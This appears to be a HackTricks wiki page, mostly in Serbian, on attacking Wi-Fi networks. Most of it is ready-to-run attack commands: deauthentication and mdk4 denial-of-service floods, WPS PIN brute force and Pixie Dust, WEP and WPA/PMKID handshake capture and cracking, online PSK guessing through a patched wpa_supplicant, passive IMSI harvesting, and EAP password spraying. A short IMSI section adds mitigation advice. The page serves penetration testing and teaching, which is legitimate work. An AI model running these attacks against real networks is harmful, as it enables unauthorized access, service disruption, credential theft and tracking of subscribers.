# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi osnovne komande
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Alati

### Hijacker & NexMon (Android interni Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Pokrenite airgeddon koristeći docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Može izvesti Evil Twin, KARMA i Known Beacons napade i zatim koristiti phishing template da dobije stvarnu lozinku mreže ili presretne social network credentials.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Ovaj alat automatizuje **WPS/WEP/WPA-PSK** napade. Automatski će:

- Postaviti interfejs u monitor mode
- Skenirati moguće mreže - i dozvoliti ti da izabereš metu/metu(e)
- Ako je WEP - pokrenuti WEP napade
- Ako je WPA-PSK
- Ako je WPS: Pixie dust attack i bruteforce attack (pazi — brute-force attack može potrajati dugo). Primeti da ne pokušava null PIN ili database/generated PINs.
- Pokušati da uhvati PMKID sa AP-a da bi ga crack-ovao
- Pokušati deauthenticate klijente AP-a da bi uhvatio handshake
- Ako PMKID ili Handshake, pokušati bruteforce koristeći top5000 lozinki.

## Pregled napada

- **DoS**
- Deauthentication/disassociation -- Isključiti sve (ili specifičan ESSID/Client)
- Random fake APs -- Sakriti mreže, moguće rušenje skenera
- Overload AP -- Pokušati "ubiti" AP (obično nije previše korisno)
- WIDS -- Igrati se sa IDS-om
- TKIP, EAPOL -- Neki specifični napadi za DoS nekih AP-ova
- **Cracking**
- Crack **WEP** (više alata i metoda)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Korisno za hvatanje captive portal creds i/ili izvođenje LAN napada
- **WPA-PSK** Evil Twin -- Korisno za mrežne napade ako znaš lozinku
- **WPA-MGT** -- Korisno za hvatanje korporativnih credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Korisno za hvatanje captive portal creds i/ili izvođenje LAN napada
- **+ WPA** -- Korisno za hvatanje WPA handshakes

## Kratke napomene za Open / OWE mreže

- **Passive capture** na open SSID-ovima i dalje radi sa monitor mode i tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) izvodi razmenu ključeva po stanici (no PSK), tako da su air frames šifrovani čak i na "open" SSID-ovima. Pošto je zasnovan na WPA3, takođe sprovodi **802.11w PMF**, koji blokira spoofed deauth/disassoc frames.
- OWE **ne autentifikuje** joinere: bilo ko može da se associate, zato **verify client isolation** umesto da verujete marketinškim tvrdnjama. Bez isolation, ARP spoofing ili responder-style poisoning na lokalnom L2 i dalje funkcioniše.
- **Evil Twin** ostaje izvediv na open/OWE SSID-ovima predstavljajući jači signal; PMF samo uklanja deauth prečicu. Ako žrtve prihvate falsifikovani TLS cert, potpuni HTTP(S) MitM je ponovo moguć.
- Broadcast poisoning na open guest Wi-Fi lako daje creds/hashes (LLMNR/NBT-NS/mDNS). Vidi:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Opis preuzet sa** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, a prevalent method in Wi-Fi hacking, involve forging "management" frames to **forcefully disconnect devices from a network**. These unencrypted packets deceive clients into believing they are from the legitimate network, enabling attackers to collect WPA handshakes for cracking purposes or to persistently disrupt network connections. This tactic, alarming in its simplicity, is widely used and has significant implications for network security.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 znači deauthentication
- 1 je broj deauths koje treba poslati (možete poslati više ako želite); 0 znači slati ih kontinuirano
- -a 00:14:6C:7E:40:80 je MAC adresa access point-a
- -c 00:0F:B5:34:30:30 je MAC adresa klijenta koji treba deauthenticate; ako je ovo izostavljeno, šalje se broadcast deauthentication (ne radi uvek)
- ath0 je ime interfejsa

### Disassociation Packets

**Disassociation packets**, slični deauthentication packets, su tip management frame koji se koristi u Wi-Fi mrežama. Ovi paketi služe da prekinu vezu između uređaja (kao što su laptop ili smartphone) i access point-a (AP). Glavna razlika između disassociation i deauthentication leži u scenarijima njihove upotrebe. Dok AP emituje **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, restart, or relocating, čime je potrebno isključiti sve povezane čvorove.

**Ovaj napad se može izvesti pomoću mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Još DOS napada pomoću mdk4**

**U** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Šalje beacon frames kako bi prikazao fake APs klijentima. Ovo ponekad može srušiti network scanners i čak drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Slanje authentication frames svim dostupnim Access Points (APs) u dometu može preopteretiti te APs, naročito kada je uključen veliki broj clients. Ovaj intenzivan saobraćaj može uzrokovati nestabilnost sistema, zbog čega se neki APs zamrznu ili čak resetuju.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**REŽIM NAPADA p: SSID Probing and Bruteforcing**

Probing Access Points (APs) proverava da li je SSID pravilno otkriven i potvrđuje domet AP-a. Ova tehnika, u kombinaciji sa **bruteforcing hidden SSIDs** sa ili bez wordlist-a, pomaže u identifikovanju i pristupanju skrivenim mrežama.

**REŽIM NAPADA m: Michael Countermeasures Exploitation**

Slanje nasumičnih ili dupliranih paketa u različite QoS redove može pokrenuti Michael Countermeasures na **TKIP APs**, što dovodi do privremenog isključivanja AP-a na jednu minutu. Ova metoda je efikasna **DoS** (Denial of Service) taktika.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Preplavljivanje AP-a sa EAPOL Start frames stvara lažne sesije, preopterećujući AP i onemogućavajući legitimne klijente. Alternativno, injektovanje lažnih EAPOL Logoff messages prisilno prekida veze klijenata; obe metode efikasno ometaju mrežnu uslugu.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Napadi na IEEE 802.11s mesh mreže**

Različiti napadi na upravljanje vezama i rutiranje u mesh mrežama.

**ATTACK MODE w: Zbunjenost WIDS-a**

Povezivanje klijenata sa više WDS čvorova ili lažnih rogue APs može manipulisati Intrusion Detection and Prevention Systems, stvarajući konfuziju i potencijalnu zloupotrebu sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**REŽIM NAPADA f: Packet Fuzzer**

Packet fuzzer koji sadrži raznovrsne izvore paketa i sveobuhvatan skup modifikatora za manipulaciju paketima.

### **Airggedon**

_**Airgeddon**_ nudi većinu napada pomenutih u prethodnim komentarima:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) pojednostavljuje proces povezivanja uređaja na ruter, ubrzavajući i olakšavajući podešavanje za mreže šifrovane **WPA** ili **WPA2** Personal. Neefikasan je protiv lako kompromitovane WEP zaštite. WPS koristi 8-cifreni PIN, proveravan u dve polovine, zbog čega je podložan brute-force napadima zbog ograničenog broja kombinacija (oko 11.000 mogućnosti).

### WPS Bruteforce

Postoje 2 glavna alata za izvođenje ovog napada: Reaver i Bully.

- **Reaver** je dizajniran kao robustan i praktičan alat za napad protiv WPS, i testiran je protiv širokog spektra access point-ova i WPS implementacija.
- **Bully** je **nova implementacija** WPS brute force napada, napisana u C. Ima nekoliko prednosti u odnosu na originalni reaver kod: manje zavisnosti, poboljšane performanse memorije i CPU-a, ispravno rukovanje endianness-om, i robusniji skup opcija.

Napad iskorišćava ranjivost **WPS PIN-a**, naročito izlaganje prvih četiri cifre i ulogu poslednje cifre kao checksum-a, što olakšava brute-force napad. Međutim, odbrane protiv brute-force napada, poput **blokiranja MAC adresa** agresivnih napadača, zahtevaju **rotaciju MAC adresa** da bi se napad nastavio.

Po pribavljanju WPS PIN-a pomoću alata kao što su Bully ili Reaver, napadač može izvesti dedukciju WPA/WPA2 PSK-a, obezbeđujući **perzistentan pristup mreži**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Ovaj rafinirani pristup cilja WPS PINs koristeći poznate ranjivosti:

1. **Pre-otkriveni PINs**: Koristite bazu podataka poznatih PINs povezanih sa određenim proizvođačima koji su poznati po upotrebi uniformnih WPS PINs. Ova baza povezuje prva tri okteta MAC-addresses sa verovatnim PINs za te proizvođače.
2. **Algoritmi za generisanje PIN-ova**: Iskoristite algoritme kao što su ComputePIN i EasyBox, koji izračunavaju WPS PINs na osnovu MAC-address AP-a. Arcadyan algoritam dodatno zahteva device ID, dodajući nivo procesu generisanja PINs.

### WPS Pixie Dust attack

**Dominique Bongard** je otkrio grešku u nekim Access Points (APs) vezano za kreiranje tajnih kodova, poznatih kao **nonces** (**E-S1** i **E-S2**). Ako se ovi nonces mogu otkriti, cracking AP-ovog WPS PIN postaje lak. AP otkriva PIN unutar posebnog koda (hash) da dokaže da je legitiman i nije fake (rogue) AP. Ovi nonces su ustvari "ključevi" za otvaranje "sefa" koji sadrži WPS PIN. Više o tome može se naći [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Jednostavno rečeno, problem je u tome što neki APs nisu koristili dovoljno nasumične ključeve za enkripciju PIN-a tokom procesa konekcije. To čini PIN ranjivim na pogađanje izvan mreže (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Ako ne želite prebaciti uređaj u monitor mode, ili ako `reaver` i `bully` imaju neki problem, možete probati [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Ovaj alat može izvesti Pixie Dust attack bez potrebe za prebacivanjem u monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Neki loše dizajnirani sistemi čak dozvoljavaju da **Null PIN** (prazan ili nepostojeći PIN) omogući pristup, što je prilično neuobičajeno. Alat **Reaver** može testirati ovu ranjivost, za razliku od **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Sve predložene WPS napade možete lako izvesti koristeći _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 i 6 vam omogućavaju da probate **vaš prilagođeni PIN** (ako ga imate)
- 7 i 8 izvršavaju **Pixie Dust attack**
- 13 vam omogućava da testirate **NULL PIN**
- 11 i 12 će **prikupiti PIN-ove povezane sa izabranim AP iz dostupnih baza podataka** i **generisati** moguće **PIN-ove** koristeći: ComputePIN, EasyBox i opciono Arcadyan (preporučeno, zašto ne?)
- 9 i 10 će testirati **svaki mogući PIN**

## **WEP**

**Zašto propada**

- RC4 seed je samo **IV (24 bits) + shared key**. IV je cleartext, mali (2^24), i brzo se ponavlja, pa ciphertexts sa istim IV ponovo koriste isti keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predvidljivi headers + RC4 KSA biases (**FMS**) vam omogućavaju da “glasate” bajtove ključa. **PTW** optimizuje ovo koristeći ARP traffic da smanji zahteve na desetine hiljada paketa umesto miliona.
- Integritet je samo **CRC32** (linearno/bez ključa), tako da napadač može da menja bitove i ponovo izračuna CRC32 bez ključa → packet forgery/replay/ARP injection dok čeka IV-e.

Praktičan break je determinističan:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon i dalje dolazi sa "All-in-One" WEP workflow ako više volite vođeni UI.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

U 2018. godini, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) novu metodu napada, jedinstvenu jer zahteva samo **jedan paket** i ne zahteva da bilo koji klijent bude povezan na ciljni AP — dovoljna je interakcija između napadača i AP-a.

Mnogi moderni ruteri dodaju **opciono polje** u **prvi EAPOL** okvir tokom asocijacije, poznato kao `Robust Security Network`. Ovo uključuje `PMKID`.

Kao što originalni post objašnjava, **PMKID** se kreira koristeći poznate podatke:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
S obzirom da je "PMK Name" konstantan, znamo BSSID AP-a i station-a, i `PMK` je identičan onom iz potpunog 4-way handshake, **hashcat** može iskoristiti ove informacije da crack-uje PSK i povrati passphrase!

Da biste **prikupili** ove informacije i lokalno **bruteforce**-ovali lozinku, možete uraditi:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Uhvaćeni **PMKIDs** biće prikazani u **console** i takođe **sačuvani** u \_ **/tmp/attack.pcap**\_\
Sada konvertuj capture u **hashcat/john** format i crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Imajte na umu da format ispravnog hash-a sadrži **4 dela**, kao: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Ako vaš **sadrži samo 3 dela**, onda je **neispravan** (PMKID capture nije bio validan).

Imajte u vidu da `hcxdumptool` **takođe capture handshakes** (nešto ovako će se pojaviti: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Možete **pretvoriti** **handshakes** u **hashcat**/**john** format koristeći `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some **handshakes** captured with this tool couldn't be **cracked** even knowing the correct **password**. I would recommend to capture **handshakes** also via traditional way if possible, or capture several of them using this tool._

### Handshake snimanje

Napad na **WPA/WPA2** mreže može se izvesti hvatanjem **handshake** i pokušajem da se **crack**-uje **password** **offline**. Ovaj proces uključuje praćenje komunikacije određene mreže i **BSSID** na određenom **channel**. Evo pojednostavljenog vodiča:

1. Identifikujte **BSSID**, **channel**, i **connected client** ciljane mreže.
2. Koristite `airodump-ng` za praćenje mrežnog saobraćaja na navedenom **channel** i **BSSID**, u nadi da ćete uhvatiti **handshake**. Komanda će izgledati ovako:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Da biste povećali šansu za hvatanje handshake-a, na kratko prekinite vezu klijenta sa mreže kako biste ga primorali na ponovnu autentifikaciju. Ovo se može uraditi koristeći komandu `aireplay-ng`, koja šalje deauthentication packets klijentu:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Imajte na umu da, pošto je klijent bio deauthenticated, može pokušati da se poveže na drugi AP ili, u drugim slučajevima, na drugu network._

Kada se u `airodump-ng` pojave informacije o handshake, to znači da je handshake uhvaćen i da možete prestati da slušate:

![](<../../images/image (172) (1).png>)

Kada je handshake uhvaćen, možete ga **crack** pomoću `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Proveri da li fajl sadrži handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Ako ovaj alat pronađe nepotpun handshake za ESSID pre nego što pronađe kompletan, neće detektovati važeći._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Brže online pogađanje PSK-a preko `wpa_supplicant` ctrl socket (no clients/PMKID)

Kada nema clients u blizini i AP odbija PMKID, možete iterativno isprobavati PSK-ove online bez ponovnog pokretanja supplicants:

- Patch `wpa_supplicant.c` da forsirate `dur = 0;` u logici backoff-a za auth failure (oko `ssid->auth_failures`), čime se efektivno onemogućava timer za temporary-disable.
- Pokrenite jedan daemon sa control socket-om:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Upravljaj njime preko kontrolnog interfejsa, ponovo koristeći isti scan i network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Mala petlja u Pythonu koja čita socket događaje (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) može da testira ~100 pokušaja za ~5 minuta bez dodatnog vremena potrošenog na skeniranje. Ipak, i dalje je bučno i detektabilno, ali izbegava restartovanje procesa za svaki pokušaj i kašnjenja zbog backoff-a.

## **WPA Enterprise (MGT)**

U **enterprise WiFi okruženjima naići ćete na različite metode autentifikacije**, od kojih svaka pruža različite nivoe bezbednosti i mogućnosti upravljanja. Kada koristite alate kao što je `airodump-ng` za pregled mrežnog saobraćaja, možete primetiti identifikatore za ove vrste autentifikacije. Neke uobičajene metode uključuju:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ova metoda podržava hardware token-e i one-time password-e unutar EAP-PEAP. Za razliku od MSCHAPv2, ne koristi peer challenge i šalje lozinke u plaintext-u ka access point-u, što predstavlja rizik za downgrade napade.
2. **EAP-MD5 (Message Digest 5)**:
- Podrazumeva slanje MD5 heša lozinke od klijenta. **Nije preporučljivo** zbog ranjivosti na dictionary napade, nedostatka autentifikacije servera i nemogućnosti generisanja session-specific WEP ključeva.
3. **EAP-TLS (Transport Layer Security)**:
- Koristi i client-side i server-side sertifikate za autentifikaciju i može dinamički generisati user-based i session-based WEP ključeve za sigurnu komunikaciju.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Pruža mutual authentication kroz enkriptovani tunel, zajedno sa metodom za izvedbu dinamičkih, po-korisniku, po-seansi WEP ključeva. Zahteva samo server-side sertifikate, dok klijenti koriste credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funkcioniše slično EAP-u tako što kreira TLS tunel za zaštićenu komunikaciju. Omogućava upotrebu slabijih autentifikacionih protokola iznad EAP zbog zaštite koju pruža tunel.
- **PEAP-MSCHAPv2**: Često nazivan PEAP, kombinuje ranjivi MSCHAPv2 challenge/response mehanizam sa zaštitnim TLS tunelom.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Slično EAP-TLS ali inicira TLS tunel pre razmene sertifikata, pružajući dodatni nivo bezbednosti.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Čitajući [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) izgleda da ako koristite **EAP** **"Identity"** **messages** moraju biti **supported**, i da će **korisničko ime** biti poslato u **jasno** u **"Response Identity"** porukama.

Čak i koristeći jednu od najsigurnijih autentifikacionih metoda: **PEAP-EAP-TLS**, moguće je **uhvatiti username poslat u EAP protokolu**. Da biste to uradili, **snimite authentication komunikaciju** (pokrenite `airodump-ng` na kanalu i `wireshark` na istom interfejsu) i filtrirajte pakete po `eapol`.\
Unutar "**Response, Identity**" paketa pojaviće se **korisničko ime** klijenta.

![](<../../images/image (850).png>)

### Anonymous Identities

Sakrivanje identiteta podržano je i u EAP-PEAP i u EAP-TTLS. U kontekstu WiFi mreže, EAP-Identity zahtev obično inicira access point (AP) tokom procesa asociacije. Da bi se zaštitila anonimnost korisnika, odgovor EAP klijenta na korisnikovom uređaju sadrži samo osnovne informacije potrebne početnom RADIUS serveru za obradu zahteva. Ovaj koncept ilustruju sledeći scenariji:

- EAP-Identity = anonymous
- U ovom scenariju svi korisnici koriste pseudonim "anonymous" kao svoj user identifier. Početni RADIUS server funkcioniše kao EAP-PEAP ili EAP-TTLS server, odgovoran za upravljanje server-side delom PEAP ili TTLS protokola. Inner (protected) autentifikacioni metod se zatim ili obrađuje lokalno ili delegira na udaljeni (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- U ovoj situaciji, korisnici iz različitih realm-ova skrivaju svoje identitete dok ukazuju na svoje odgovarajuće realm-ove. Ovo omogućava početnom RADIUS serveru da proksira EAP-PEAP ili EAP-TTLS zahteve ka RADIUS serverima u njihovim home realm-ovima, koji deluju kao PEAP ili TTLS serveri. Početni RADIUS server tada funkcioniše samo kao RADIUS relay node.
- Alternativno, početni RADIUS server može funkcionisati kao EAP-PEAP ili EAP-TTLS server i ili obraditi protected authentication method ili ga proslediti drugom serveru. Ova opcija omogućava konfiguraciju različitih politika za različite realm-ove.

U EAP-PEAP, nakon što se TLS tunel uspostavi između PEAP servera i PEAP klijenta, PEAP server inicira EAP-Identity zahtev i prenosi ga kroz TLS tunel. Klijent odgovara na ovaj drugi EAP-Identity zahtev slanjem EAP-Identity odgovora koji sadrži pravi identitet korisnika kroz enkriptovani tunel. Ovaj pristup efikasno sprečava otkrivanje stvarnog identiteta korisnika bilo kome ko prisluškuje 802.11 saobraćaj.

EAP-TTLS prati nešto drugačiju proceduru. Kod EAP-TTLS, klijent se obično autentifikuje koristeći PAP ili CHAP, osigurano TLS tunelom. U tom slučaju, klijent uključuje User-Name atribut i ili Password ili CHAP-Password atribut u inicijalnoj TLS poruci poslatoj nakon uspostavljanja tunela.

Bez obzira na izabrani protokol, PEAP/TTLS server dobija informaciju o stvarnom identitetu korisnika nakon što je TLS tunel uspostavljen. Stvarni identitet može biti predstavljen kao user@realm ili jednostavno user. Ako PEAP/TTLS server takođe odgovara za autentifikaciju korisnika, on sada poseduje korisnikov identitet i nastavlja sa autentifikacionim metodom zaštićenim TLS tunelom. Alternativno, PEAP/TTLS server može proslediti novi RADIUS zahtev korisnikovom home RADIUS serveru. Ovaj novi RADIUS zahtev izostavlja PEAP ili TTLS protokolsku slojevitost. U slučajevima gde je protected authentication method EAP, unutrašnje EAP poruke se prenose home RADIUS serveru bez EAP-PEAP ili EAP-TTLS omotača. User-Name atribut izlazne RADIUS poruke sadrži pravi identitet korisnika, zamenjujući anonymous User-Name iz ulaznog RADIUS zahteva. Kada je protected authentication method PAP ili CHAP (podržano samo od strane TTLS), User-Name i drugi authentication atributi izvučeni iz TLS payload-a se zamenjuju u izlaznoj RADIUS poruci, zamenjujući anonymous User-Name i TTLS EAP-Message atribute iz ulaznog RADIUS zahteva.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) curenje identiteta (otkrivanje IMSI)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Kliknite za prikaz</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Napomene:
- Radi pre nego što se uspostavi bilo koji TLS tunel ako implementacija koristi gol EAP‑SIM/AKA bez zaštićenih identiteta/pseudonima.
- Otkrivena vrednost je trajni identifikator vezan za SIM pretplatnika; njegovo prikupljanje omogućava dugoročno praćenje i dalja zloupotrebljavanja u telekomunikacijama.

Uticaj
- Privatnost: trajno praćenje korisnika/uređaja iz pasivnih Wi‑Fi snimaka na javnim mestima.
- Olakšavanje telekom zloupotreba: sa IMSI, napadač sa SS7/Diameter pristupom može upitivati lokaciju ili pokušati presretanje poziva/SMS i krađu MFA.

Ublažavanje / na šta treba obratiti pažnju
- Proverite da klijenti koriste anonimne spoljne identitete (pseudonime) za EAP‑SIM/AKA u skladu sa smernicama 3GPP (npr. 3GPP TS 33.402).
- Preferirajte tunelovanje faze identiteta (npr. EAP‑TTLS/PEAP koji nosi unutrašnji EAP‑SIM/AKA) tako da IMSI nikada ne bude poslat u jasnom tekstu.
- Snimci paketa asocijacije/autentifikacije nikada ne bi trebalo da otkriju sirovi IMSI u EAP-Response/Identity.

Povezano: Eksploatacija telekom signalizacije sa uhvaćenim mobilnim identifikatorima
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Ako se od klijenta očekuje da koristi **username and password** (napomena: **EAP-TLS won't be valid** u ovom slučaju), možete pokušati da dobijete **listu** **usernames** (videti sledeći deo) i **passwords** i pokušate da **bruteforce** pristup koristeći [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer).
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Takođe možete izvesti ovaj napad koristeći `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teorija napada na klijenta

